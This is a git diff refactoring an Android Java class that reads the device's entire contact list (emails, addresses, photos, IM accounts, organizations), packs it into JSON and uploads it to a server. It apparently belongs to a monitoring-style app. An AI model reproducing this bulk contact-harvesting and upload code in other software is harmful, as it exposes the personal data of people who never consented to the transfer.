@@ -21,10 +21,10 @@ import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
 import android.util.Base64;
 
 import com.inet.android.bs.NetworkChangeReceiver;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
 
 /**
  * ListContact class is designed to get the list of contact
@@ -32,13 +32,13 @@ import com.inet.android.utils.ValueWork;
  * @author johny homicide
  * 
  */
-public class ListContacts extends AsyncTask<Context, Void, Void> {
+public class ContactsList extends AsyncTask<Context, Void, Void> {
 	private Context mContext;
 	private ArrayList<String> email = null;
 	private ArrayList<String> emailType = null;
 	private ArrayList<CharSequence> CustomemailType = null;
 
-	private String LOG_TAG = ListContacts.class.getSimpleName().toString();
+	private String LOG_TAG = ContactsList.class.getSimpleName().toString();
 	private String complete;
 	private int version;
 	private int imType;
@@ -51,17 +51,18 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 		JSONObject jsonPhoneType;
 		JSONObject jsonContact;
 		ContentResolver cr = mContext.getContentResolver();
-		
-		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_CONTACTS, mContext);
-		
+
+		version = AppSettings.getSetting(AppConstants.TYPE_LIST_CONTACTS,
+				mContext);
+
 		String encodedImage = null;
 		StringBuilder sAdress;
 
 		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
 				null, null, null);
 
-		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
-				if (cur.getCount() > 0) {
+		if (NetworkChangeReceiver.isOnline(mContext) != 0) {
+			if (cur.getCount() > 0) {
 				while (cur.moveToNext()) {
 					complete = "0";
 					jsonContact = new JSONObject();
@@ -164,7 +165,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 							int type = addrCur
 									.getInt(addrCur
 											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
-							if (!sAdress.equals(" "))
+							if (sAdress.length() != 0)
 								jsonInfo.put("адрес",
 										"(" + getTipeAddress(type) + ") "
 												+ sAdress.toString());
@@ -253,9 +254,9 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 							}
 
 						}
-
+						imCur.close();
 					}
-					imCur.close();
+
 					// ----------------------------------------------------------------------------------------------------------------------------------------------------
 					// Get Organizations
 					// ------------------------------------------
@@ -327,7 +328,8 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 
 		} else {
 			Logging.doLog(LOG_TAG, "else connect", "else connect");
-			TurnSendList.setList(ConstantValue.TYPE_LIST_CONTACTS, version, "0", mContext);
+			Queue.setList(AppConstants.TYPE_LIST_CONTACTS, version, "0",
+					mContext);
 		}
 	}
 
@@ -339,7 +341,9 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 	private void sendRequest(String str, String complete) {
 		Logging.doLog(LOG_TAG, "sendRequest: complete " + complete,
 				"sendRequest: complete " + complete);
-		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_CONTACTS_REQUEST, complete, version, mContext);
+		RequestList.sendDemandRequest(str,
+				AppConstants.TYPE_LIST_CONTACTS_REQUEST, complete, version,
+				mContext);
 	}
 
 	private String getTipe(int phonetype) {
